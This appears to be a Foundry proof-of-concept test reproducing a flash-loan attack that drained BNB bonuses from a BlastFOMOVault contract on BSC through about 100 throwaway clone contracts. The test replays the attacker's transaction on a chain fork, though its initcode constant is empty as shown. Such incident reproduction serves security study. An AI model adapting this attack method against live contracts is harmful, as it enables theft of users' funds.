pragma solidity ^0.8.15;

import "../basetest.sol";

// @KeyInfo - Total Lost : ~1.2884 BNB attacker profit (vault BNB bonus drain)
// Attacker : https://bscscan.com/address/0xaea29218262dc6b0904ca077f6527c49dfd426d9
// Attack Contract : CREATE in attack tx (factory 0x17fd1e04… then helper 0x3ca5544b… + ~100 claim clones)
// Vulnerable Contract : https://bscscan.com/address/0xbfb18b2c1c1b6b099f0e2b1e962c03210f24900e (BlastFOMOVault)
// Attack Tx : https://bscscan.com/tx/0x0e37a1ba8ae064a10286abbe6bc9c7f89078c252f5db9d3e78115be8d4f189f3
//
// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0xbfb18b2c1c1b6b099f0e2b1e962c03210f24900e#code
// BlastFOMO token : 0xa7f1d4a9bca6884f464ccd2407909d504e407777
// TaxProcessor : 0x857115364e65db01fc8a92a0541b4dce415d587a
// ListaDAO Moolah : 0x8f73b65b4caaf64fba2af91cc5d4a2a1318e5d8c
//
// @Analysis
// Root cause: BlastFOMOVault.claimBonus (and related payout path) can be invoked from
// freshly deployed temporary contracts so that each clone receives a BNB bonus share
// without a durable per-beneficiary claim lock that survives CREATE2/CREATE identity
// churn. Attacker flash-borrows 120 WBNB from ListaDAO Moolah, routes BlastFOMO via
// PancakeSwap (triggering tax/processor accounting), then spins ~100 minimal clones
// that each call the vault bonus payout and selfdestruct the received BNB back to the
// attack helper. Net attacker profit ≈ 1.2884 BNB (ExVul labels this ETH; chain is BSC).
//
// PoC strategy: replay the historical CREATE initcode at block 97306496 (one before
// the exploit). The factory constructor deploys the helper, runs the flash-loan
// attack path, and selfdestructs; clones selfdestruct after each claimBonus.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

contract BlastFOMOVault_exp is BaseTestWithBalanceLog {
    address constant ATTACKER = 0xAEA29218262dc6b0904Ca077f6527C49dfd426D9;
    address constant VAULT = 0xbFb18B2C1c1B6B099F0E2b1E962c03210f24900E;
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant BLAST_FOMO = 0xA7f1d4a9bca6884F464CCD2407909D504e407777;
    address constant MOOLAH = 0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C;
    address constant TAX_PROCESSOR = 0x857115364e65db01Fc8a92A0541B4dcE415d587a;
    address constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    // Historical attack-tx CREATE initcode (factory + embedded helper + claim clone)
    bytes constant ATTACK_INITCODE =
        hex"";

    uint256 constant ATTACK_BLOCK = 97_306_497;
    uint256 constant FORK_BLOCK = ATTACK_BLOCK - 1;

    // Exact attacker native-BNB delta observed on-chain (post − pre at attack block)
    uint256 constant HISTORICAL_PROFIT = 1_288_418_562_948_543_283;

    function setUp() public {
        // Online warm uses archive BSC RPC; exhaustive_warm rewrites to anvil port 8546.
        vm.createSelectFork("http://127.0.0.1:8546", FORK_BLOCK);
        fundingToken = address(0); // native BNB
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker");
        vm.label(VAULT, "BlastFOMOVault");
        vm.label(WBNB, "WBNB");
        vm.label(BLAST_FOMO, "BlastFOMO");
        vm.label(MOOLAH, "ListaDAO Moolah");
        vm.label(TAX_PROCESSOR, "TaxProcessor");
        vm.label(PANCAKE_ROUTER, "PancakeRouterV2");
    }

    function testExploit() public balanceLog {
        // Note: balanceLog with fundingToken=0 + attacker set logs ATTACKER native balance
        // without zeroing it (BoostHook basetest). Measure delta against historical pre/post.
        uint256 balBefore = ATTACKER.balance;
        uint256 vaultBefore = VAULT.balance;

        vm.startPrank(ATTACKER, ATTACKER);
        address created;
        bytes memory initCode = ATTACK_INITCODE;
        assembly {
            created := create(0, add(initCode, 0x20), mload(initCode))
        }
        vm.stopPrank();
        require(created != address(0), "CREATE failed");

        uint256 balAfter = ATTACKER.balance;
        uint256 vaultAfter = VAULT.balance;
        require(balAfter >= balBefore, "attacker lost BNB");
        uint256 profit = balAfter - balBefore;

        emit log_named_decimal_uint("Attacker BNB profit", profit, 18);
        emit log_named_decimal_uint("Vault BNB before", vaultBefore, 18);
        emit log_named_decimal_uint("Vault BNB after", vaultAfter, 18);
        if (vaultBefore > vaultAfter) {
            emit log_named_decimal_uint("Vault BNB drained", vaultBefore - vaultAfter, 18);
        }

        // Historical on-chain profit was 1.288418562948543283 BNB; allow small fork slack.
        assertGt(profit, 1.2 ether, "attacker BNB profit too low");
        assertLt(vaultAfter, vaultBefore, "vault BNB not reduced");
    }
}
